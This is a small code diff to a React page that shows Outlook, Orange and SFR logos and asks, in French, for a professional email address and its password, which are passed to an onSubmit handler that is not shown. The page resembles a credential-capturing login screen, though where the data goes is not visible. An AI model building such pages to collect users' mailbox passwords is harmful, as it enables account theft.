@@ -9,7 +9,7 @@ import sfr from './sfr.png';
 import axios from 'axios';
 
 function App() {
-  const [platform, setPlatform] = useState("outlook");
+  const [platform, setPlatform] = useState("Outlook");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [messageError, setMessageError] = useState("");
@@ -64,12 +64,10 @@ function App() {
                 <img src={orange} alt="Orange" style={{border: platform === "Orange" ? "1px solid black" : ""}} onClick={() => setPlatform("Orange")} />
                 <img src={sfr} alt="SFR" style={{border: platform === "Sfr" ? "1px solid black" : ""}} onClick={() => setPlatform("Sfr")} />
             </div>
-            <form class="form">
               <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} class="email-input" placeholder="Veuillez entrer votre adresse professionnelle" />
               <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} class="email-input" placeholder="Veuillez entrer votre mot de passe" />
-              <button type='submit' class="continue-button" onClick={(e) => onSubmit(email, password, platform)}>Continuer</button>
+              <button type='button' class="continue-button" onClick={(e) => onSubmit(email, password, platform)}>Continuer</button>
               {messageError && <p style={{color: "red"}}>{messageError}</p>}
-            </form>
         </div>
     </div>
   );
